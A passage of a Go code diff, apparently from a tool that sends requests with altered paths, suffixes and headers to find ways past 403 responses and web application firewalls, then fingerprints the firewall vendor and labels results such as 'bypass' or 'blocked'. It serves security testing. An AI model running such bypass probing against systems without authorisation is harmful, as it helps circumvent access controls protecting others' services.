+		u.Fragment = ""
+		probe = u.String()
+	}
+
+	req, err := http.NewRequest("GET", probe, nil)
+	if err != nil {
+		return Baseline{URL: probe, Error: err.Error()}
+	}
+	req.Header.Set("User-Agent", browserUA())
+
+	fo := doFetch(client, req, timeoutSec)
+	return Baseline{
+		URL:      probe,
+		Status:   fo.status,
+		Length:   fo.length,
+		BodyHash: fo.hash,
+		Title:    fo.title,
+		Server:   fo.server,
+		FinalURL: fo.finalURL,
+		Duration: fo.dur,
+		Error:    fo.err,
+	}
+}
+
+// ---------- WAF fingerprint ----------
+
+func detectWAF(server string) string {
+	s := strings.ToLower(server)
+	cases := []struct{ needle, name string }{
+		{"cloudflare", "Cloudflare"},
+		{"akamai", "Akamai"},
+		{"awselb", "AWS ELB"},
+		{"amazon", "AWS"},
+		{"sucuri", "Sucuri"},
+		{"incapsula", "Imperva Incapsula"},
+		{"imperva", "Imperva"},
+		{"big-ip", "F5 BIG-IP"},
+		{"bigip", "F5 BIG-IP"},
+		{"barracuda", "Barracuda"},
+		{"fortiweb", "FortiWeb"},
+		{"netscaler", "Citrix NetScaler"},
+		{"citrix", "Citrix NetScaler"},
+	}
+	for _, c := range cases {
+		if strings.Contains(s, c.needle) {
+			return c.name
+		}
+	}
+	if s == "" {
+		return "Unknown"
+	}
+	return server
+}
+
+// ---------- helpers ----------
+
+func randomSlug(n int) string {
+	const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = alphabet[rand.Intn(len(alphabet))]
+	}
+	return string(b)
+}
+
+func browserUA() string {
+	return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
+		"(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+}
+
+// ---------- request execution ----------
+
+func runBypasses(client *http.Client, target string, payloads []Payload, threads, timeoutSec int) []Result {
+	var (
+		results []Result
+		mu      sync.Mutex
+		wg      sync.WaitGroup
+	)
+	sem := make(chan struct{}, threads)
 
 	for _, pl := range payloads {
 		wg.Add(1)
 		sem <- struct{}{}
-
 		go func(pl Payload) {
 			defer wg.Done()
 			defer func() { <-sem }()
 
-			reqURL := target
-			if pl.PathOverride != "" {
-				u, err := url.Parse(target)
-				if err == nil {
-					portStr := ""
-					if u.Port() != "" {
-						portStr = ":" + u.Port()
-					}
-					reqURL = fmt.Sprintf("%s://%s%s%s", u.Scheme, u.Hostname(), portStr, pl.PathOverride)
-				}
-			} else if pl.Suffix != "" {
-				reqURL = strings.TrimSuffix(reqURL, "/") + pl.Suffix
-			}
-
-			method := pl.Method
-			if method == "" {
-				method = "GET"
-			}
-
-			req, err := http.NewRequest(method, reqURL, nil)
+			reqURL, method, headers, err := buildRequest(target, pl)
 			if err != nil {
+				mu.Lock()
+				results = append(results, Result{
+					Payload: headerDesc(pl), Type: pl.Type,
+					Method: pl.Method, URL: target, Error: err.Error(), Verdict: "error",
+				})
+				mu.Unlock()
 				return
 			}
-			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
 
-			headerDesc := ""
-			if pl.Header != nil {
-				for k, v := range pl.Header {
-					req.Header.Set(k, v)
-					headerDesc += fmt.Sprintf("%s: %s ", k, v)
-				}
+			var body io.Reader
+			if pl.Body != "" {
+				body = strings.NewReader(pl.Body)
 			}
-
-			resp, err := client.Do(req)
+			req, err := http.NewRequest(method, reqURL, body)
 			if err != nil {
+				mu.Lock()
+				results = append(results, Result{
+					Payload: headerDesc(pl), Type: pl.Type,
+					Method: method, URL: reqURL, Error: err.Error(), Verdict: "error",
+				})
+				mu.Unlock()
 				return
 			}
-			defer resp.Body.Close()
+			if req.Header.Get("User-Agent") == "" {
+				req.Header.Set("User-Agent", browserUA())
+			}
+			for k, v := range headers {
+				req.Header.Set(k, v)
+			}
+			if pl.ContentType != "" {
+				req.Header.Set("Content-Type", pl.ContentType)
+			}
 
-			desc := pl.Type
-			if headerDesc != "" {
-				desc += " [" + strings.TrimSpace(headerDesc) + "]"
-			}
-			if pl.PathOverride != "" {
-				desc += " [Path: " + pl.PathOverride + "]"
-			} else if pl.Suffix != "" {
-				desc += " [Suffix: " + pl.Suffix + "]"
-			}
+			fo := doFetch(client, req, timeoutSec)
 
 			mu.Lock()
-			results = append(results, BypassResult{
-				Payload:    desc,
+			results = append(results, Result{
+				Payload:    headerDesc(pl),
+				Type:       pl.Type,
 				Method:     method,
-				StatusCode: resp.StatusCode,
-				Length:     int(resp.ContentLength),
+				URL:        reqURL,
+				StatusCode: fo.status,
+				Length:     fo.length,
+				BodyHash:   fo.hash,
+				Title:      fo.title,
+				Location:   fo.location,
+				Server:     fo.server,
+				Duration:   fo.dur,
+				Error:      fo.err,
 			})
 			mu.Unlock()
-
 		}(pl)
 	}
-
 	wg.Wait()
 	return results
+}
+
+// buildRequest computes the final URL and method for a payload.
+func buildRequest(target string, pl Payload) (reqURL, method string, headers map[string]string, err error) {
+	method = pl.Method
+	if method == "" {
+		method = "GET"
+	}
+	headers = pl.Header
+
+	u, perr := url.Parse(target)
+	if perr != nil {
+		return "", method, headers, perr
+	}
+
+	switch {
+	case pl.PathOverride != "":
+		// Rebuild the URL against host so Go doesn't re-encode the payload path.
+		reqURL = u.Scheme + "://" + u.Host + pl.PathOverride
+	case pl.Suffix != "":
+		raw := strings.TrimSuffix(target, "/")
+		if u.RawQuery != "" {
+			raw = u.Scheme + "://" + u.Host + u.EscapedPath()
+		}
+		reqURL = raw + pl.Suffix
+	default:
+		reqURL = target
+	}
+	return reqURL, method, headers, nil
+}
+
+func headerDesc(pl Payload) string {
+	parts := []string{}
+	for k, v := range pl.Header {
+		parts = append(parts, k+": "+v)
+	}
+	desc := pl.Type
+	if len(parts) > 0 {
+		desc += " [" + strings.Join(parts, "; ") + "]"
+	}
+	if pl.PathOverride != "" {
+		desc += " [path: " + pl.PathOverride + "]"
+	} else if pl.Suffix != "" {
+		desc += " [suffix: " + pl.Suffix + "]"
+	}
+	return desc
+}
+
+// ---------- classification ----------
+
+func classify(results []Result, base Baseline) {
+	for i := range results {
+		r := &results[i]
+		switch {
+		case r.Error != "":
+			r.Verdict = "error"
+		case r.StatusCode == 0:
+			r.Verdict = "error"
+		case base.BodyHash != "" && r.BodyHash == base.BodyHash:
+			r.SameAsBase = true
+			if r.StatusCode >= 200 && r.StatusCode < 300 {
+				r.Verdict = "soft-200" // 200 with baseline body → custom error page
+			} else {
+				r.Verdict = "blocked"
+			}
+		case r.StatusCode >= 200 && r.StatusCode < 300:
+			r.Verdict = "bypass"
+		case r.StatusCode >= 300 && r.StatusCode < 400:
+			r.Verdict = "redirect"
+		case r.StatusCode == 401:
+			r.Verdict = "auth-required"
+		case r.StatusCode == 403:
+			r.Verdict = "blocked"
+		case r.StatusCode >= 500:
+			r.Verdict = "error5xx"
+		default:
+			r.Verdict = "neutral"
+		}
+	}
+}
+
+// clusterSignatures groups results by status + body hash so noisy duplicates
+// collapse into a single line in the report.
+func clusterSignatures(results []Result) []string {
+	seen := map[string]struct{}{}
+	var clusters []string
+	for _, r := range results {
+		key := fmt.Sprintf("%d|%s", r.StatusCode, r.BodyHash)
+		if _, ok := seen[key]; ok {
+			continue
+		}
+		seen[key] = struct{}{}
+		short := r.BodyHash
+		if len(short) >= 8 {
+			short = short[:8]
+		}
+		if short == "" {
+			short = "nohash"
+		}
+		label := fmt.Sprintf("%d %s len=%d", r.StatusCode, short, r.Length)
+		if r.Title != "" {
+			label += " title=" + r.Title
+		}
+		clusters = append(clusters, label)
+	}
+	return clusters
+}
+
+func sortResults(results []Result) {
+	rank := map[string]int{
+		"bypass":        0,
+		"redirect":      1,
+		"neutral":       2,
+		"soft-200":      3,
+		"auth-required": 4,
+		"blocked":       5,
+		"error5xx":      6,
+		"error":         7,
+	}
+	// Insertion sort is fine here (1200+ items × tiny constant).
+	for i := 1; i < len(results); i++ {
+		cur := results[i]
+		j := i - 1
+		for j >= 0 && rank[results[j].Verdict] > rank[cur.Verdict] {
+			results[j+1] = results[j]
+			j--
+		}
+		results[j+1] = cur
+	}
 }
